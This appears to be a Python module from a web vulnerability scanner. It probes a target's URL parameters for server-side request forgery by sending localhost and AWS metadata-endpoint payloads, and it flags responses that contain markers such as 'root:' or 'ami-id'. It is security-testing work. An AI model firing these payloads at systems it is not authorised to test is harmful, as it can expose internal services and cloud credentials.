import time
from core.engine import inject_params
from core.session import http
from core.banner import Banner

class SSRFScanner:
    def __init__(self, t, e):
        self.t = t; self.e = e

    def run(self):
        payloads = ["http://127.0.0.1","http://localhost",
                    "http://169.254.169.254/latest/meta-data/","http://[::1]"]
        indicators = ["root:","ami-id","instance-type","meta-data"]
        url = self.t.url
        params = ["url","uri","path","dest","redirect","callback","source","img"]
        urls = [url] if "?" in url else [url+"?"+p+"=test" for p in params[:4]]

        for u in urls:
            for pl in payloads:
                for inj in inject_params(u, pl):
                    r = http.get(inj["url"], allow_redirects=False)
                    if r:
                        for ind in indicators:
                            if ind.lower() in r.text.lower():
                                self.e.add(title="SSRF Detected", severity="CRITICAL",
                                    desc="Internal resource via '" + inj["param"] + "'",
                                    url=inj["url"], param=inj["param"], payload=pl,
                                    evidence=ind,
                                    fix="Whitelist URLs. Block internal IPs.",
                                    owasp="A10 - SSRF", module="SSRF Scanner")
                                return
                    time.sleep(0.2)
